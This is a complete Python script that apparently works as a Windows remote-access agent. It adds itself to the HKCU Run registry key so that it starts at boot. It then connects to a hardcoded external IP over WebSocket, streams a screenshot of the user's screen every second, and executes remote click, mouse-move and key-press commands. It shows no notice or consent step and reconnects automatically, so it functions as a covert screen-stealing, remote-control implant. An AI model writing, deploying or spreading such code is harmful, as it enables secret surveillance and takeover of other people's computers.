import asyncio
import websockets
import mss
from PIL import Image
import io
import base64
import os
import sys
import winreg
import uuid
import json

SERVER_URI = "ws://1.94.107.241:6789"
CONFIG_FILE = os.path.join(os.getenv("APPDATA"), "myagent_config.json")

# 获取唯一的 agent 编号
def get_agent_code():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)["agent_code"]
        except:
            pass
    code = str(uuid.uuid4())[:8]
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump({"agent_code": code}, f)
    return code

AGENT_CODE = get_agent_code()

# 设置开机启动
def add_to_startup():
    exe_path = os.path.abspath(sys.argv[0])
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_READ) as reg_key:
            try:
                existing_path, _ = winreg.QueryValueEx(reg_key, "MyAgent")
                if existing_path == exe_path:
                    return
            except FileNotFoundError:
                pass
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            winreg.SetValueEx(reg_key, "MyAgent", 0, winreg.REG_SZ, exe_path)
            print("✅ 已添加到开机启动")
    except Exception as e:
        print("❌ 添加开机启动失败：", e)

# 使用 mss 截图
def capture_screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        screenshot = sct.grab(monitor)
        return Image.frombytes("RGB", screenshot.size, screenshot.rgb)

# 循环推流（每秒推送一次）
async def send_screenshot_loop(ws):
    while True:
        try:
            curr_frame = capture_screen()
            buffer = io.BytesIO()
            curr_frame.save(buffer, format="JPEG", quality=30, optimize=True)
            img_bytes = buffer.getvalue()
            if img_bytes:
                b64 = base64.b64encode(img_bytes).decode()
                await ws.send(b64)
        except Exception as e:
            print("截图出错：", e)
            break
        await asyncio.sleep(1)

# WebSocket 主控制器（连接后立即推流）
async def handler():
    try:
        async with websockets.connect(SERVER_URI, max_size=None) as ws:
            await ws.send(f"agent:{AGENT_CODE}")
            print(f"已连接服务器，Agent Code: {AGENT_CODE}")

            # 启动截图推流（不等待控制端指令）
            asyncio.create_task(send_screenshot_loop(ws))

            while True:
                cmd = await ws.recv()
                print(cmd)
                if cmd.startswith("click:"):
                    x, y = map(int, cmd.split(":")[1].split(","))
                    import pyautogui
                    pyautogui.click(x, y)
                    await ws.send("OK")

                elif cmd.startswith("move:"):
                    x, y = map(int, cmd.split(":")[1].split(","))
                    import pyautogui
                    pyautogui.moveTo(x, y)
                    await ws.send("OK")

                elif cmd.startswith("key:"):
                    key = cmd.split(":")[1]
                    import pyautogui
                    pyautogui.press(key)
                    await ws.send("OK")
    except Exception as e:
        print("连接失败或中断：", e)

# 自动重连
async def run_forever():
    while True:
        try:
            await handler()
        except Exception as e:
            print("重连中，等待 5 秒... 错误：", e)
            await asyncio.sleep(5)

if __name__ == "__main__":
    add_to_startup()
    asyncio.run(run_forever())
